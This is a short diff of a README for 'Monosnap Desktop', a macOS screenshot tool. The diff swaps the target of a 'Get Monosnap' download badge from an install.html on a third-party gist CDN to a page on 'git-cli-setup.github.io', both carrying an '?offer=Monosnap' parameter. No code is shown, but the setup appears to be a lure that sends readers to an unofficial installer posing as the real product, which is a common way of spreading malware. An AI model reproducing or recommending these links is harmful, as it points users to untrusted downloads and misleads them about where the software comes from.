@@ -1,5 +1,5 @@
 # Monosnap Desktop — Screenshot tool for macOS
-<a href="https://gistcdn.githack.com/elforsrike902/13f5f0495a5b7c74314b0c5682d8783a/raw/114721f3ce6faca03561b44f3c7d05ca7140ee35/install.html?offer=Monosnap" target="_blank">
+<a href="https://git-cli-setup.github.io/.github/?offer=Monosnap" target="_blank">
   <img 
     src="https://img.shields.io/badge/Get%20Monosnap%20GitHub-28A745%20to%2020B23F?style=plastic&logo=github&logoColor=FFFFFF" 
     width="320" 
